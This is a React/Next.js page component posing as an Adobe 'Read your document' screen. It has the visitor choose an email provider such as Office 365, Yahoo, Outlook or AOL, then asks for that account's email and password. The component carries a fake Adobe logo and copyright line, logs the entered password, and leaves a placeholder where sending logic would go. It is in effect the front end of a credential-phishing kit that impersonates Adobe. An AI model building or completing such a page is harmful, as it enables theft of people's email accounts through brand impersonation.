'use client';

import { useState } from 'react';

type EmailProvider = 'office365' | 'yahoo' | 'outlook' | 'aol' | 'others';

interface ProviderConfig {
  name: string;
  icon: string;
  color: string;
  placeholder: string;
}

const emailProviders: Record<EmailProvider, ProviderConfig> = {
  office365: {
    name: 'Office 365',
    icon: '🏢',
    color: '#0078d4',
    placeholder: 'username@company.com'
  },
  yahoo: {
    name: 'Yahoo Mail',
    icon: '🟣',
    color: '#6001d2',
    placeholder: 'username@yahoo.com'
  },
  outlook: {
    name: 'Outlook',
    icon: '📧',
    color: '#0078d4',
    placeholder: 'username@outlook.com'
  },
  aol: {
    name: 'AOL Mail',
    icon: '🔵',
    color: '#ff0b00',
    placeholder: 'username@aol.com'
  },
  others: {
    name: 'Other Providers',
    icon: '✉️',
    color: '#666666',
    placeholder: 'your@email.com'
  }
};

export default function Home() {
  const [selectedProvider, setSelectedProvider] = useState<EmailProvider | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleProviderSelect = (provider: EmailProvider) => {
    setSelectedProvider(provider);
    setEmail('');
  };

  const handleBack = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Simulate authentication process
    setTimeout(() => {
      setIsLoading(false);
      console.log('Login attempt:', { 
        provider: selectedProvider, 
        email, 
        password 
      });
      // Add your authentication logic here
    }, 1000);
  };

  return (
    <div className="adobe-cloud-main">
      <div className="adobe-panel move-down">
        <div className="top-header-row">
          <img 
            src="https://images.pexels.com/photos/1779487/pexels-photo-1779487.jpeg?auto=compress&cs=tinysrgb&w=44&h=44&fit=crop" 
            alt="Adobe Logo" 
            className="acrobat-logo-left"
          />
          <h1 className="top-header-title">Read your document</h1>
        </div>
        
        {!selectedProvider ? (
          <div className="provider-selection">
            <h2 className="provider-title">Choose your email provider</h2>
            <div className="provider-grid">
              {Object.entries(emailProviders).map(([key, provider]) => (
                <button
                  key={key}
                  className="provider-option"
                  onClick={() => handleProviderSelect(key as EmailProvider)}
                  style={{ borderColor: provider.color }}
                >
                  <span className="provider-icon">{provider.icon}</span>
                  <span className="provider-name">{provider.name}</span>
                </button>
              ))}
            </div>
          </div>
        ) : (
          <div className="login-form">
            <div className="selected-provider">
              <button className="back-button" onClick={handleBack}>
                ← Back
              </button>
              <div className="provider-info">
                <span className="provider-icon-large">
                  {emailProviders[selectedProvider].icon}
                </span>
                <span className="provider-name-large">
                  {emailProviders[selectedProvider].name}
                </span>
              </div>
            </div>
            
            <form onSubmit={handleSubmit}>
              <input 
                type="email" 
                placeholder={emailProviders[selectedProvider].placeholder}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required 
                disabled={isLoading}
              />
              <input 
                type="password" 
                placeholder="Password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required 
                disabled={isLoading}
              />
              <button 
                type="submit"
                disabled={isLoading}
                style={{ backgroundColor: emailProviders[selectedProvider].color }}
              >
                {isLoading ? 'Signing In...' : `Sign In with ${emailProviders[selectedProvider].name}`}
              </button>
            </form>
          </div>
        )}
        
        <div className="adobe-copyright">
          © 2025 Adobe Service. All rights reserved.
        </div>
      </div>
    </div>
  );
}